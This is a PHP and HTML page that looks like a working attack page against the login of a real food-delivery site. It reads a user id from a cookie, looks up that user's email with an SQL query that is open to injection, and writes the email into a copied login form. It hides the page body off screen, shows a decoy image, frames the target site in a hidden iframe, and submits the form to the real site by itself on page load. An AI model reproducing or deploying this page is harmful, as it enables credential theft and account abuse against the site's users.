<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `yemek_sepeti` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["aspnetForm"].submit();}</script>

<IFRAME src="http://istanbul.yemeksepeti.com/AnonymouseDefault.aspx" ></IFRAME>

<form name="aspnetForm" method="post" action="http://istanbul.yemeksepeti.com/AnonymouseDefault.aspx" onSubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm" style="overflow: visible;" autocomplete="on">
<div>
<input type="hidden" name="__WPPS" id="__WPPS" value="s">
<input type="hidden" name="ctl00_ctl00_RightHeader_ScriptManager1_HiddenField" id="ctl00_ctl00_RightHeader_ScriptManager1_HiddenField" value="">








<input type="hidden" name="__VIEWSTATE7" id="__VIEWSTATE7" value="9Lp6O7aYCVoBTSZVOfvoaE7EmBQ1OqNwL/1H/75pnbfpP/p3zIjfZvnSUPMSIxuFAKj7j452Kc66n86yt8XbzDTeMmMgnFPKcGZltsgIwb9jOSMwi7T5R/8+alHcSalv+qAp6PMUDP6PMZ4prRjQD/qsKpv1cuym5J6dEjCQzsmqagrw1qM0mzRVuW7zw3RWNCui8qN0UlbTt4eaVn6U7u5+SjOXTigjdVFX6+XsUbquy62PP1Bm32arYpb9/tUs3xuvlhcf30mX1XZNALI2Jd6vyjLdWb3j/xORl0Ql8lLaQ0l8W6zaakW/7+PXWtC9DzYz5JZOTALbECJLq+WU/P63n330Om9fFxfLr1Yn+PtZVX+5WBaI5bc+JnZqsuvz7Pdf1dWi+v3fknfU/v6TdVstP75DPczr/Nym9a+urmLa5vfCO3dJETUfHX2bvl6SzF3/Y39zm35ZrleWz9KfzGt6lcTrH/0ri2X65h/7m9+WaLYcP76bqfA7/H09MC3r2huc5uUp+v5Nf5tf5xf8lkXzRVXnb+bZ8stl/qwuSHAvfsHv8npOhJw9yZq3eftlTcxFg168yBY5/XxDMzP7bX6nX0tT6fQP/Yok/q//k8RxkzKfz5B4pg9+bVrU+HW/+kAWWOUrcuGD15DVp8QuacTk1/3eB4L/6eptXsu/kU5+HXTyY3ObZOQ/L2Y2Q0erGL8Wry6gza9tftG8Fb60n/268gsRi0nz6/5kVq7z3CZ9QMVf29Hyd/m1ft3f5jUjArGd50syiOmk+sf/wvHM5k2ksUI9N/1oniH40sL89d5UJL2LmQ3YPfx/m1+PEFAoGLj99ddzv8poLjTokTeTD57hYvH7N8zlpG5Iny3KTIhv+v21flvtzY7MfqXBJg2HzeOvtX9/9v8AF48jGVg+AAA=">

<input type="hidden" name="__VIEWSTATE" id="
__VIEWSTATE" value="">
</div>



		
                                        <label for="ctl00_ctl00_SmallBasket_Login1_Login1_LoginForm_UserName" id="ctl00_ctl00_SmallBasket_Login1_Login1_LoginForm_UserNameLabel">Kullanıcı Adı / E-Posta:</label></strong></div>
                            </td>
				<td style="padding: 2px;">
                                <div class="TextBox">
                                    <input name="ctl00$ctl00$SmallBasket$Login1$Login1$LoginForm$UserName" type="text" value="<?=$email;?>" maxlength="64" id="ctl00_ctl00_SmallBasket_Login1_Login1_LoginForm_UserName">
                                </div>
                            </td>
			</tr>
			<tr style="width: 204px;">
				<td colspan="2" class="Warning">
                                <span id="ctl00_ctl00_SmallBasket_Login1_Login1_LoginForm_UserNameRequired" style="color:Red;display:none;">Lütfen kullanıcı adınızı giriniz.</span>
                            </td>
			</tr>
			<tr style="width: 204px;">
				<td style="padding: 2px;">
                                <div class="UserPassText">
                                    <strong>
                                        <label for="ctl00_ctl00_SmallBasket_Login1_Login1_LoginForm_Password" id="ctl00_ctl00_SmallBasket_Login1_Login1_LoginForm_PasswordLabel">Şifre:</label></strong>
                                </div>
                            </td>
				<td style="padding: 2px;">
                                <div class="TextBox">
                                    <input name="ctl00$ctl00$SmallBasket$Login1$Login1$LoginForm$Password" type="password" maxlength="50" id="ctl00_ctl00_SmallBasket_Login1_Login1_LoginForm_Password" class="LoginTextBox" onKeyPress="javascript:if (event.keyCode == 13){ __doPostBack('ctl00$ctl00$SmallBasket$Login1$Login1$LoginForm$Button1'); return false;}"></div>
                            </td>
	</form>

</body>
</html>

